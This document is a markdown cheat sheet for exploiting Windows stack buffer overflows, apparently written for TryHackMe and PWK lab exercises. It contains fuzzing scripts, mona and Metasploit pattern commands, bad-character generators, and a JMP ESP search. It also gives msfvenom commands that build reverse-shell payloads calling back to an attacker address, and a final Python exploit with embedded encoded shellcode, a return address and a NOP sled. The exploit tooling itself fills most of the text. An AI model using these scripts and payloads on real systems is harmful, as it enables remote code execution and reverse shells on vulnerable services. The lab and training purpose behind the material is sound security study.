

### Set working space for mona (immunity)
```shell
!mona config -set workingfolder c:\mona\%p
```
### Exploit Scripts

1. Create a paylods to determine if the application is vul. (and determine the aproximate length of the payload)

#### while loop 1 (THM@Custom): 

```python
#!/usr/bin/env python3

import socket, time, sys, os

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "PPPP"
size = 100

while True:
    cmd = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l '+str(size)
    stream = os.popen(cmd)
    pattern = stream.read()
    payload = prefix + pattern
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip, port))
			s.recv(1024)
			print("Fuzzing with {} bytes".format(len(payload) - len(prefix)))
			s.send(bytes(payload, "latin-1"))
			s.recv(1024)
	except:
		print("Fuzzing crashed at {} bytes".format(len(payload) - len(prefix)))
		sys.exit(0)
	size += 100 
	time.sleep(1) # 1 sec
#THM
```

#### while loop 1 (PWK@Custom): 

```python
#!/usr/bin/python3
import socket
import time
import sys

size = 100
prefix = "PPPP"

while(size < 2000):
	cmd = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l '+str(size)
	stream = os.popen(cmd)
	pattern = stream.read()
	payload = prefix + pattern
	try:
		print "\nSending evil buffer with %s bytes" % size
		content = "username=" + payload + "&password=A"
		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: 10.11.0.22\r\n"
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Referer: http://10.11.0.22/login\r\n"
		buffer += "Connection: close\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length: "+str(len(content))+"\r\n"
		buffer += "\r\n"
		buffer += content
		s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("10.11.0.22", 80))
		s.send(buffer)
		s.close()
		print("Fuzzing with {} bytes".format(len(payload) - len(prefix)))
		size += 100
		time.sleep(1) #10 sec
	except:
		print("Fuzzing crashed at {} bytes".format(len(payload) - len(prefix)))
		sys.exit()
```

#### RAW Script (THM):

```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 999
overflow = "A" * offset
retn = "XXXX"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

#### RAW Script (PWK):

```python
#!/usr/bin/python
import socket
try:
	print "\nSending evil buffer..."
	size = 800
	inputBuffer = b"A" * size
	content = "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 10.11.0.22\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefo
	x/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
	\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://10.11.0.22/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	buffer += content
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.11.0.22", 80))
	s.send(buffer)
	s.close()
	print "\nDone!"
except:
	print "\nCould not connect!"


```



### Determine the exact length of the Payload

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
```

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6000 -q 77C9D95A
```

```shell
!mona findmsp -distance 800
```

```python
#!/usr/bin/python3

import os

size = 3000

#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 33644132


cmd = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l '+str(size)
stream = os.popen(cmd)
payload = stream.read()

print(payload)

f = open("exploit.txt",'w')
f.write(payload)
f.close()
```


### Bad Characters
#### 1. Generate a list of bad characters

```shell
#!/usr/bin/python3

import netifaces as ni

##################################
__author__ = " AGHARGHAR Zakariya"
__version__ = "0.1"

###################################

def formatHex(hex):
	if (len(hex[1:]) == 2):
		return '\\x0'+hex[2]
		
def formatBadChars(badChars):
	newBadChars = ''
	for bad in badChars:
		if(formatHex(str(hex(bad))[1:]) is not None):
			newBadChars += '\\'+str(hex(bad)[1:])
		else:
			newBadChars += "\\x0"+str(hex(bad))[2]
	return newBadChars

def allHexChars(excluded):
	badchars = b''
	for i in range(256):
			if i not in excluded:
				badchars += bytes([i])
	return badchars
	
	
def main():
	tun0Ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

####################### ADD Your BAD CHARS ###################################
#excluded  = (0x00, 0x06, 0x0a, 0x1a, 0x3b, 0xcf)
	excluded  = (0x00,)
	NonBadChars = allHexChars(excluded)
	visibleBadChars = formatBadChars(excluded)
	
	
	maxPayloadChars = 3000
	offset = 1804
	overflow = b"A" * offset
	retn = b"BBBB"

			
			
	print('Non Bad Chars len: '+ str(len(NonBadChars)) )
	print('Non Bad Chars : '+ ', '.join([str(hex(bad)) for bad in excluded]) )
	print('Non Bad Chars to copy: '+ visibleBadChars )
	print('Payload Test : msfvenom --platform windows --arch x86  -p windows/exec CMD=calc.exe -b \''+ visibleBadChars +'\' -f exe -o exploit.exe')
	print('Payload Test2 : msfvenom --platform windows --arch x86  -p windows/exec CMD=calc.exe -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	print('Payload Exploit wins x86 : msfvenom -p windows/shell_reverse_tcp LHOST='+tun0Ip+' LPORT=443 EXITFUNC=thread  –e x86/shikata_ga_nai -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	print('Payload Exploit lins x86 : msfvenom -p linux/x86/shell_reverse_tcp LHOST='+tun0Ip+' LPORT=443 EXITFUNC=thread –e x86/shikata_ga_nai -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	formatBadChars(excluded)



	payload = overflow + retn + NonBadChars + (maxPayloadChars - len(overflow) - len(retn) - len(NonBadChars) )*  b"D"

	f = open('exploit.txt','wb')
	f.write(payload)
	f.close()


if __name__ == "__main__":
    main()
    
    
    



```

```python
import sys

shift = 1
rows = 16

for x in range(0,shift*3):
    print(' ',end="")
for x in range(1,256):
    if((x+shift) % rows == 1 ):
        print("")
    sys.stdout.write(" " + '{:02x}'.format(x))

```

#### 2. Test bad characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default

```shell
!mona bytearray -b "\x00\x07\x0b"
```

```shell
!mona compare -f c:\mona\vuln-app-windows\bytearray.bin -a 005FD0C0
#Comapre Shell code pushed (pattern_create.rb) with array generated by mona 
```

To Test: 

```shell
msfvenom --platform windows --arch x86  -p windows/exec CMD=calc.exe -b '\x00\x0a\x1a\x39\x85\xeb' -f raw -o exploit.txt
```

### Finding a Jump Point
finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified

```shell
!mona jmp -r esp -cpb "\x00"
#searching for jump ESP without bad chars
```

*Advanced tip: If this application was compiled with DEP support, our JMP ESP
address would have to be located in the .text code segment of the module, as
that is the only segment with both Read (R) and Executable (E) permissions.
However, since DEP is not enabled, we are free to use instructions from any
address in this module.


### Generate Payload
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.18.128 LPORT=443 EXITFUNC=thread -f raw –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"
```
### Prepend NOPs

In the raw exploit script:

```shell
padding = "\x90" * 16
```



### ##################################

### FINAL SCRIPT EXP:

```python
#!/usr/bin/python3

import netifaces as ni

##################################
__author__ = " AGHARGHAR Zakariya"
__version__ = "0.1"

###################################

def formatHex(hex):
	if (len(hex[1:]) == 2):
		return '\\x0'+hex[2]
		
def formatBadChars(badChars):
	newBadChars = ''
	for bad in badChars:
		if(formatHex(str(hex(bad))[1:]) is not None):
			newBadChars += '\\'+str(hex(bad)[1:])
		else:
			newBadChars += "\\x0"+str(hex(bad))[2]
	return newBadChars

def allHexChars(excluded):
	badchars = b''
	for i in range(256):
			if i not in excluded:
				badchars += bytes([i])
	return badchars
	
	
def main():
	tun0Ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

####################### ADD Your BAD CHARS ###################################
#excluded  = (0x00, 0x06, 0x0a, 0x1a, 0x3b, 0xcf)
	excluded  = (0x00,0x07,0x0b,0x0d,0x1a,0xa0)
	NonBadChars = allHexChars(excluded)
	visibleBadChars = formatBadChars(excluded)
	
	
	maxPayloadChars = 3000
	offset = 1804
	overflow = b"A" * offset
	retn = b"\xA8\x11\x80\x14"
	nop = b"\x90" * 16
			
			
	print('Non Bad Chars len: '+ str(len(NonBadChars)) )
	print('Non Bad Chars : '+ ', '.join([str(hex(bad)) for bad in excluded]) )
	print('Non Bad Chars to copy: '+ visibleBadChars )
	print('Payload Test : msfvenom --platform windows --arch x86  -p windows/exec CMD=calc.exe -b \''+ visibleBadChars +'\' -f exe -o exploit.exe')
	print('Payload Test2 : msfvenom --platform windows --arch x86  -p windows/exec CMD=calc.exe -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	print('Payload Exploit wins x86 : msfvenom -p windows/shell_reverse_tcp LHOST='+tun0Ip+' LPORT=443 EXITFUNC=thread –e x86/shikata_ga_nai -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	print('Payload Exploit lins x86 : msfvenom -p linux/x86/shell_reverse_tcp LHOST='+tun0Ip+' LPORT=443 EXITFUNC=thread –e x86/shikata_ga_nai -b \''+ visibleBadChars +'\' -f raw -o exploit.txt')
	formatBadChars(excluded)


	buf =  b""
	buf += b"\xba\xac\xe8\xc0\x89\xda\xce\xd9\x74\x24\xf4\x5b\x29"
	buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x6f\xec\x22"
	buf += b"\x7c\x93\x05\x20\x7f\x6b\xd6\x45\x09\x8e\xe7\x45\x6d"
	buf += b"\xdb\x58\x76\xe5\x89\x54\xfd\xab\x39\xee\x73\x64\x4e"
	buf += b"\x47\x39\x52\x61\x58\x12\xa6\xe0\xda\x69\xfb\xc2\xe3"
	buf += b"\xa1\x0e\x03\x23\xdf\xe3\x51\xfc\xab\x56\x45\x89\xe6"
	buf += b"\x6a\xee\xc1\xe7\xea\x13\x91\x06\xda\x82\xa9\x50\xfc"
	buf += b"\x25\x7d\xe9\xb5\x3d\x62\xd4\x0c\xb6\x50\xa2\x8e\x1e"
	buf += b"\xa9\x4b\x3c\x5f\x05\xbe\x3c\x98\xa2\x21\x4b\xd0\xd0"
	buf += b"\xdc\x4c\x27\xaa\x3a\xd8\xb3\x0c\xc8\x7a\x1f\xac\x1d"
	buf += b"\x1c\xd4\xa2\xea\x6a\xb2\xa6\xed\xbf\xc9\xd3\x66\x3e"
	buf += b"\x1d\x52\x3c\x65\xb9\x3e\xe6\x04\x98\x9a\x49\x38\xfa"
	buf += b"\x44\x35\x9c\x71\x68\x22\xad\xd8\xe5\x87\x9c\xe2\xf5"
	buf += b"\x8f\x97\x91\xc7\x10\x0c\x3d\x64\xd8\x8a\xba\x8b\xf3"
	buf += b"\x6b\x54\x72\xfc\x8b\x7d\xb1\xa8\xdb\x15\x10\xd1\xb7"
	buf += b"\xe5\x9d\x04\x17\xb5\x31\xf7\xd8\x65\xf2\xa7\xb0\x6f"
	buf += b"\xfd\x98\xa1\x90\xd7\xb0\x48\x6b\xb0\x7e\x24\x04\xad"
	buf += b"\x17\x37\xea\x2c\x53\xbe\x0c\x44\xb3\x97\x87\xf1\x2a"
	buf += b"\xb2\x53\x63\xb2\x68\x1e\xa3\x38\x9f\xdf\x6a\xc9\xea"
	buf += b"\xf3\x1b\x39\xa1\xa9\x8a\x46\x1f\xc5\x51\xd4\xc4\x15"
	buf += b"\x1f\xc5\x52\x42\x48\x3b\xab\x06\x64\x62\x05\x34\x75"
	buf += b"\xf2\x6e\xfc\xa2\xc7\x71\xfd\x27\x73\x56\xed\xf1\x7c"
	buf += b"\xd2\x59\xae\x2a\x8c\x37\x08\x85\x7e\xe1\xc2\x7a\x29"
	buf += b"\x65\x92\xb0\xea\xf3\x9b\x9c\x9c\x1b\x2d\x49\xd9\x24"
	buf += b"\x82\x1d\xed\x5d\xfe\xbd\x12\xb4\xba\xde\xf0\x1c\xb7"
	buf += b"\x76\xad\xf5\x7a\x1b\x4e\x20\xb8\x22\xcd\xc0\x41\xd1"
	buf += b"\xcd\xa1\x44\x9d\x49\x5a\x35\x8e\x3f\x5c\xea\xaf\x15"



	payload = overflow + retn + nop +buf + (maxPayloadChars - len(overflow) - len(retn) - len(buf) - len(nop) )*  b"D"

	f = open('exploit.txt','wb')
	f.write(payload)
	f.close()


if __name__ == "__main__":
    main()
    
    
    

    

    
    

```